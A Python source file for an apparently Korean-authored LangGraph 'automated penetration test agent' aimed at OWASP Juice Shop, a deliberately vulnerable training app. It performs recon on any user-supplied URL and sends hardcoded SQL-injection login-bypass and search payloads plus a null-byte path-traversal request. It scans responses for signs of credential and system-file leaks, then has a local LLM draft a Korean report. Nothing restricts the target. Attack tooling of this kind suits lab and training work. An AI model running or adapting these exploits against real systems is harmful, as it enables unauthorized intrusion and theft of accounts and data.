import os
import sys
if sys.platform == 'win32':
    os.add_dll_directory(os.getcwd())
    try:
        import sqlite3
    except:
        pass

import socket
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from typing import TypedDict, Dict, Any
from urllib.parse import urlparse

from langchain_chroma import Chroma
from langchain_huggingface import HuggingFaceEmbeddings
from langchain_ollama import ChatOllama
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.output_parsers import StrOutputParser
from langgraph.graph import StateGraph, END

# --- 기본 설정 ---
MODEL_ID = "llama3.2"  # 더 안정적인 모델로 변경 (또는 dolphin-llama3)
DB_PATH = os.environ.get(
    "HACKYMOCCHI_DB_PATH",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "chroma_data"),
)
COLLECTION_KNOWLEDGE = "vuln_knowledge"
COLLECTION_PAYLOADS = "hacking_payloads"

class AgentState(TypedDict):
    target_url: str
    target_ip: str
    detected_tech: str
    context: str
    final_payload: str
    is_success: bool
    attempts: int
    last_feedback: str
    http_method: str  # GET 또는 POST
    post_data: Dict[str, Any]  # POST 데이터

# [Node 1] 정찰 (Reconnaissance)
def recon_node(state: AgentState):
    print("\n[*] 단계 1: 정찰 시작...")
    url = state["target_url"]
    try:
        domain = urlparse(url).netloc.split(':')[0]
        ip = socket.gethostbyname(domain)
        response = requests.get(url, timeout=3, verify=False)
        server = response.headers.get('Server', 'Unknown')
        tech = "General Web App"
        if "Apache" in server: tech = "Apache"
        elif "Nginx" in server: tech = "Nginx"
        
        print(f"    IP: {ip}")
        print(f"    Server: {server}")
        print(f"    Tech: {tech}")
    except Exception as e:
        print(f"    정찰 실패: {e}")
        ip, tech = "Unknown", "Web Vulnerability"
    
    return {"target_ip": ip, "detected_tech": tech, "attempts": 0}

# [Node 2] 지식 및 무기 검색 (RAG)
def retrieval_node(state: AgentState):
    print("\n[*] 단계 2: 취약점 및 페이로드 검색...")
    
    try:
        embeddings = HuggingFaceEmbeddings(model_name="sentence-transformers/all-MiniLM-L6-v2")
        
        if not os.path.exists(DB_PATH):
            return {"context": f"No knowledge base found. Using general techniques for {state['detected_tech']}."}

        db_know = Chroma(
            persist_directory=DB_PATH, 
            embedding_function=embeddings, 
            collection_name=COLLECTION_KNOWLEDGE
        )
        db_pay = Chroma(
            persist_directory=DB_PATH, 
            embedding_function=embeddings, 
            collection_name=COLLECTION_PAYLOADS
        )
        
        docs_know = db_know.similarity_search(state["detected_tech"], k=2)
        docs_pay = db_pay.similarity_search(state["detected_tech"], k=3)
        
        context_text = "\n".join([d.page_content for d in docs_know + docs_pay])
        
        if not context_text.strip():
            context_text = f"No specific payloads found. Use standard {state['detected_tech']} exploits."
        
        print(f"    검색 완료: {len(docs_know + docs_pay)}개 문서")
        return {"context": context_text}

    except Exception as e:
        print(f"    검색 실패: {e}")
        return {"context": f"Error during retrieval. Proceeding with general {state['detected_tech']} techniques."}

# [Node 3] 적응형 페이로드 생성 (Juice Shop 특화)
def generation_node(state: AgentState):
    print(f"\n[*] 단계 3: 페이로드 생성 중... (시도 {state['attempts'] + 1}/3)")
    
    base_url = state["target_url"].rstrip('/')
    attempt = state["attempts"]
    feedback = state.get("last_feedback", "")
    
    # Juice Shop 실제 취약점 활용
    payloads = [
        # 시도 1: SQL Injection (로그인 우회)
        f"{base_url}/rest/user/login",
        
        # 시도 2: SQL Injection (검색 API)
        f"{base_url}/rest/products/search?q=qwert'))--",
        
        # 시도 3: Path Traversal (숨겨진 파일 접근)
        f"{base_url}/ftp/acquisitions.md%2500.md",
    ]
    
    # 각 페이로드에 대한 메타데이터
    methods = ["POST", "GET", "GET"]
    attack_types = ["SQL Injection (Login Bypass)", "SQL Injection (Search)", "Path Traversal"]
    
    # POST 데이터 (로그인 우회용)
    post_data = {
        "email": "admin@juice-sh.op'--",
        "password": "anything"
    }
    
    payload = payloads[attempt % len(payloads)]
    method = methods[attempt % len(methods)]
    attack_type = attack_types[attempt % len(attack_types)]
    
    print(f"    공격 타입: {attack_type}")
    print(f"    HTTP 메소드: {method}")
    print(f"    페이로드: {payload}")
    
    # POST 데이터도 상태에 저장
    if method == "POST":
        print(f"    POST 데이터: {post_data}")
        return {"final_payload": payload, "http_method": method, "post_data": post_data}
    
    return {"final_payload": payload, "http_method": method}

# [Node 4] 정밀 검증 (HTTP 메소드 지원)
def exploit_node(state: AgentState):
    payload = state["final_payload"]
    method = state.get("http_method", "GET")
    post_data = state.get("post_data", {})
    
    print(f"\n[*] 단계 4: 공격 시도...")
    print(f"    URL: {payload}")
    print(f"    Method: {method}")
    
    is_success = False
    feedback = ""
    
    try:
        # HTTP 요청 전송
        if method == "POST":
            print(f"    POST Data: {post_data}")
            res = requests.post(
                payload, 
                json=post_data,
                headers={"Content-Type": "application/json"},
                timeout=5, 
                verify=False
            )
        else:
            res = requests.get(payload, timeout=5, verify=False)
        
        print(f"    응답 코드: {res.status_code}")
        print(f"    응답 길이: {len(res.text)} bytes")
        
        # 응답 일부 출력
        preview = res.text[:200].replace('\n', ' ')
        print(f"    응답 미리보기: {preview}...")
        
        # 성공 지표 확인 (Juice Shop 특화)
        success_indicators = [
            "token",  # JWT 토큰 (로그인 성공)
            "admin@juice-sh.op",  # 관리자 정보
            "password",  # 비밀번호 정보 노출
            "root:x:0:0:",  # /etc/passwd
            "uid=",  # 명령 실행 성공
            "SQL syntax",  # SQL 에러 (취약점 확인)
            "You have an error in your SQL",
            "acquisitions",  # 숨겨진 파일 내용
            "PackageType",  # 제품 데이터 (SQL injection 성공)
        ]
        
        if any(ind.lower() in res.text.lower() for ind in success_indicators):
            is_success = True
            print("    [!!!] 🎯 공격 성공 지표 발견!")
            # 어떤 지표가 발견되었는지 출력
            found = [ind for ind in success_indicators if ind.lower() in res.text.lower()]
            print(f"    발견된 지표: {found}")
        else:
            if res.status_code == 403:
                feedback = "WAF blocked. Try encoding."
            elif res.status_code == 404:
                feedback = "Endpoint not found."
            elif res.status_code == 500:
                feedback = "Server error - possible vulnerability!"
            elif res.status_code == 401:
                feedback = "Authentication required."
            elif res.status_code == 200:
                feedback = "Request successful but no exploit indicators found."
            else:
                feedback = f"Status {res.status_code}. No exploit indicators."
                
    except Exception as e:
        feedback = f"Connection error: {str(e)}"
        print(f"    오류: {feedback}")

    return {
        "is_success": is_success, 
        "attempts": state["attempts"] + 1,
        "last_feedback": feedback
    }

# [Node 5] 보고서 생성 (개선된 프롬프트)
def report_node(state: AgentState):
    print("\n[*] 단계 5: 보고서 작성 중...")
    
    template = """You are a security consultant writing a penetration test report in Korean.

TEST RESULTS:
- Target: {target_url}
- IP: {target_ip}
- Technology: {detected_tech}
- Success: {is_success}
- Attempts: {attempts}
- Final Payload: {final_payload}
- Feedback: {last_feedback}

Write a professional security report in Korean with these sections:

1. 테스트 개요
2. 발견된 취약점 (성공 시) 또는 실패 원인 (실패 시)
3. 잠재적 영향
4. 권장 조치사항

Keep it concise and professional."""
    
    prompt = ChatPromptTemplate.from_template(template)
    llm = ChatOllama(model=MODEL_ID, temperature=0.5)
    chain = prompt | llm | StrOutputParser()
    
    report = chain.invoke(state)
    
    print("\n" + "="*60)
    print("레드팀 침투 테스트 보고서")
    print("="*60)
    print(report)
    print("="*60)
    
    return {"context": state["context"] + "\n\n[FINAL REPORT]\n" + report}

# 조건부 라우팅
def should_continue(state: AgentState):
    if state["is_success"]:
        return "report"
    if state["attempts"] >= 3:
        print("\n[!] 최대 시도 횟수 도달")
        return "report"
    return "retry"

# 워크플로우 구성
workflow = StateGraph(AgentState)

workflow.add_node("recon", recon_node)
workflow.add_node("retrieve", retrieval_node)
workflow.add_node("generate", generation_node)
workflow.add_node("exploit", exploit_node)
workflow.add_node("report", report_node)

workflow.set_entry_point("recon")
workflow.add_edge("recon", "retrieve")
workflow.add_edge("retrieve", "generate")
workflow.add_edge("generate", "exploit")

workflow.add_conditional_edges(
    "exploit",
    should_continue,
    {
        "retry": "generate",
        "report": "report"
    }
)

workflow.add_edge("report", END)

app = workflow.compile()

# --- 실행부 ---
if __name__ == "__main__":
    print("="*60)
    print("자동 침투 테스트 에이전트")
    print("="*60)
    
    target = input("\nTarget URL: ").strip()
    if not target.startswith("http"): 
        target = "http://" + target
    
    print(f"\n타겟 설정: {target}")
    print("시작합니다...\n")
    
    final_output = app.invoke({"target_url": target, "last_feedback": "None"})
    
    print("\n" + "="*60)
    print("최종 결과")
    print("="*60)
    print(f"성공 여부: {'✅ 성공' if final_output['is_success'] else '❌ 실패'}")
    print(f"시도 횟수: {final_output['attempts']}")
    print(f"최종 페이로드:\n{final_output['final_payload']}")
    print("="*60)